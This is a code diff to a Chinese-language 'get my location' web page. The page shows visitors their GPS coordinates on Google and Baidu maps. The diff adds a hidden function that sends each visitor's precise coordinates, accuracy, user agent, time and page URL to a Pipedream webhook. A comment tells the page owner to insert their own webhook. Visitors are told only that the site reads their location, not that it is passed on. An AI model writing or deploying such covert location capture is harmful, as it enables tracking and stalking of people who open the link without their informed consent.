@@ -5,6 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>获取我的位置</title>
   <style>
+    /* ...（你的原有样式保持不变）... */
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       text-align: center;
@@ -56,13 +57,105 @@
   </style>
 </head>
 <body>
-  <h1>📍 获取我的当前位置</h1>
+  <h1>📍 获取我的位置</h1>
   <p>点击下方按钮，允许网站获取您的地理位置。</p>
   <button onclick="getLocation()">允许获取位置</button>
   <div id="result"></div>
 
   <script>
     // ========== 坐标转换函数（WGS-84 → 百度 BD-09）==========
+    // ...（保持你之前的 wgs84ToBd09 等函数不变）...
+
+    // 【新增】上报位置到你的服务器（Pipedream）
+    async function sendLocationToServer(data) {
+      const WEBHOOK_URL = "https://d5ac41b01e3297edc6138e4847c9a815.m.pipedream.net"; // ←←← 替换成你自己的 Pipedream URL！
+
+      try {
+        const response = await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(data)
+        });
+        if (!response.ok) {
+          console.warn("上报位置失败:", response.status);
+        }
+      } catch (err) {
+        console.error("上报异常:", err);
+      }
+    }
+
+    // ========== 定位主函数 ==========
+    function getLocation() {
+      const resultDiv = document.getElementById("result");
+      resultDiv.style.display = "block";
+      resultDiv.innerHTML = "正在请求位置权限…";
+
+      if (!navigator.geolocation) {
+        resultDiv.innerHTML = "❌ 您的浏览器不支持地理定位功能。";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude, accuracy } = position.coords;
+          const timestamp = new Date().toLocaleString("zh-CN");
+          const userAgent = navigator.userAgent;
+          const latWGS = latitude.toFixed(6);
+          const lngWGS = longitude.toFixed(6);
+
+          // 转换为百度坐标
+          const [bdLat, bdLng] = wgs84ToBd09(latitude, longitude);
+
+          // 【新增】上报数据
+          sendLocationToServer({
+            timestamp,
+            latitude: latWGS,
+            longitude: lngWGS,
+            accuracy: Math.round(accuracy),
+            userAgent,
+            url: window.location.href,
+            // 可选：添加 IP（需后端获取，前端无法直接拿到公网 IP）
+          });
+
+          // 显示结果
+          const googleMapsUrl = `https://www.google.com/maps?q=${latWGS},${lngWGS}`;
+          const baiduMapsUrl = `https://api.map.baidu.com/marker?location=${bdLat},${bdLng}&title=我的位置&output=html&src=webapp`;
+
+          resultDiv.innerHTML = `
+            ✅ 定位成功！<br><br>
+            <strong>纬度：</strong> ${latWGS}<br>
+            <strong>经度：</strong> ${lngWGS}<br>
+            <div class="accuracy">📍 定位精度：±${Math.round(accuracy)} 米</div><br>
+            <a href="${googleMapsUrl}" target="_blank">在 Google 地图中查看</a> |
+            <a href="${baiduMapsUrl}" target="_blank">在 百度地图 中查看</a>
+          `;
+        },
+        (error) => {
+          let msg = "❌ 无法获取位置：";
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              msg += "您拒绝了位置权限。";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              msg += "位置信息不可用。";
+              break;
+            case error.TIMEOUT:
+              msg += "请求超时，请重试。";
+              break;
+            default:
+              msg += "未知错误。";
+          }
+          resultDiv.innerHTML = msg;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 60000
+        }
+      );
+    }
+
+    // ========== 以下是坐标转换函数（保持不变）==========
     function outOfChina(lat, lng) {
       if (lng < 72.004 || lng > 137.8347) return true;
       if (lat < 0.8293 || lat > 55.8271) return true;
@@ -116,63 +209,6 @@
     function wgs84ToBd09(lat, lng) {
       const gcj = wgs84ToGcj02(lat, lng);
       return gcj02ToBd09(gcj[0], gcj[1]);
-    }
-
-    // ========== 定位主函数 ==========
-    function getLocation() {
-      const resultDiv = document.getElementById("result");
-      resultDiv.style.display = "block";
-      resultDiv.innerHTML = "正在请求位置权限…";
-
-      if (!navigator.geolocation) {
-        resultDiv.innerHTML = "❌ 您的浏览器不支持地理定位功能。";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude, accuracy } = position.coords;
-          const latWGS = latitude.toFixed(6);
-          const lngWGS = longitude.toFixed(6);
-
-          // 转换为百度 BD-09 坐标
-          const [bdLat, bdLng] = wgs84ToBd09(latitude, longitude);
-
-          const googleMapsUrl = `https://www.google.com/maps?q=${latWGS},${lngWGS}`;
-          const baiduMapsUrl = `https://api.map.baidu.com/marker?location=${bdLat},${bdLng}&title=我的位置&output=html&src=webapp`;
-
-          resultDiv.innerHTML = `
-            ✅ 定位成功！<br><br>
-            <strong>纬度（WGS-84）：</strong> ${latWGS}<br>
-            <strong>经度（WGS-84）：</strong> ${lngWGS}<br>
-            <div class="accuracy">📍 定位精度：±${accuracy.toFixed(0)} 米</div><br>
-            <a href="${googleMapsUrl}" target="_blank">在 Google 地图中查看</a> |
-            <a href="${baiduMapsUrl}" target="_blank">在 百度地图 中查看</a>
-          `;
-        },
-        (error) => {
-          let msg = "❌ 无法获取位置：";
-          switch (error.code) {
-            case error.PERMISSION_DENIED:
-              msg += "您拒绝了位置权限。请刷新页面并允许访问。";
-              break;
-            case error.POSITION_UNAVAILABLE:
-              msg += "位置信息不可用，请确保设备 GPS 已开启。";
-              break;
-            case error.TIMEOUT:
-              msg += "请求超时，请重试（建议在室外空旷处操作）。";
-              break;
-            default:
-              msg += "发生未知错误（错误码：" + error.code + "）。";
-          }
-          resultDiv.innerHTML = msg;
-        },
-        {
-          enableHighAccuracy: true,  // 尽可能使用高精度（如 GPS）
-          timeout: 10000,            // 10 秒超时
-          maximumAge: 60000          // 1 分钟内的缓存位置可接受
-        }
-      );
     }
   </script>
 </body>
